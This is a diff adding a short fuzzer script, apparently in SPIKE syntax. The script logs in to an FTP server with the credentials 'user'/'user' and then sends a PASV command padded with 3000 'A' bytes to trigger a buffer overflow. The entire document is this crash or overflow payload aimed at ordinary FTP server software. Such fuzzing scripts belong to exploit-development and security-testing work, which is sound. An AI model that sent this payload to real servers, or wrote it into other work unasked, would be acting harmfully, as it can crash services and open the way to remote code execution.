@@ -1,0 +1,15 @@
+s_readline();
+s_readline();
+s_string("USER ");
+s_string("user");
+s_string("\r\n");
+sleep(1);
+s_readline();
+s_string("PASS ");
+s_string("user");
+s_string("\r\n");
+sleep(1);
+s_readline();
+s_string("PASV /.:/");
+s_binary_repeat("\\x41", 3000);
+s_string("\r\n");
